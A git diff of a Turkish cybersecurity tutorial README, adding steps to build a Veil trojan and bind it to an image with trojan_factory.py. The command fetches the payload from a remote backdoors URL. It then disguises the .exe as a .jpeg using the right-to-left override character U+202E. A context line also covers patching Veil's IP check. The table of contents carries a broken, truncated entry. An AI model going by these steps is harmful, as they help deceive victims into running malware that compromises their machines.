@@ -48,8 +48,14 @@
   - [Ngrok](#Ngrok)
     - [Kendi IP Adresimizi Kullanmadan Trojan Oluşturma](#Kendi-IP-Adresimizi-Kullanmadan-Trojan-Oluşturma)
     - [Hata](#Hata)
+  - [Trojan ile Görsel Birleştirme](#Trojan-ile-Görsel-Birleştirme)
+    - [Trojanin Uzantısını Değiştirme](#Trojanin Uzantısını Değiştirme)
 - [10-Sosyal Mühendislik](#Sosyal-Mühendislik)
   - [Maltego](#Maltego)
+- [11
+-
+
+
 # 1-VPN DNS MAC 
 
 VPN (Virtual Personal Network)
@@ -427,6 +433,27 @@ lport: ngrok'dan kopyaladığımız PORT
 ```/opt/veil/tools/evasion/tool.py``` içindeki kodda ```!Error!You did not provide a valid IP``` kodunu siliyoruz(421-424.satır)
 ```selected_payload__ ``` kısmını if ile alt alta getirip ```if helpes validate_ip(value)``` kodunu siliyoruz
 
+### Trojan ile Görsel Birleştirme
+
+1. İlk olarak görselimizi (.jpeg) seçip google üzerinden uzantısını ```.ico```'ya çeviriyoruz 
+2. ```Veil``` kullanarak trojan'i oluşturuyoruz
+3. İndirdiğimiz ```.ico``` uzantılı görsel ile trojan'i aynı dosya içine atıyoruz
+4. Dosya içine girip ```python3 trojan_factory.py -f http://192.168.123.456/backdoors/andorid.jpeg -e http://192.168.123.456/backdoors/mynewpayload.exe -o /opt/trojanfactory/newtest.exe ; http://192.168.123.456/backdoors/android.ico``` çalıştırıyoruz
+```
+-f: .jpeg dosyasının konumu
+-e: trojan'in konumu
+-o: .ico'nun konumu 
+```
+
+> ###  Trojan Uzantısını Değiştirme
+
+1. ```apt-get install gnome-characters``` karakter paketini indiriyoruz
+2. İndirdiğimiz framework'ü açıyoruz ve arama yerine ```right-to-right``` yazıp çıkan şeyi kopyalıyoruz
+3. ```.exe``` dosyamızın sonunda ```gepj.exe``` yazıyoruz
+3. ```gepj.exe``` kısımını seçip ```ctrl+v``` yapıyoruz ve dosya uzantısı ```.jpeg``` olarak gözüküyor
+
+```right-to-left``` characters kısmında yoksa google'a ```unicode-table``` yazıp çıkan siteden kopyalabiliriz ```U+202E```
+
 # 10-Sosyal Mühendislik
 
 ### Maltego
@@ -448,3 +475,4 @@ Sağ Click Yaparak Hangi Tür Bilgileri Edinebileceğimizi Görebiliriz Ya Da T�
 ![run](https://github.com/ahmetnuysal/Cyber-Security/blob/9b17f8f1f08083fe3766213e94b20e62b1fa1aff/WhatsApp%20Image%202022-08-17%20at%2016.38.10.jpeg)
 
 Ve toplanan bilgileri görürüz  
+
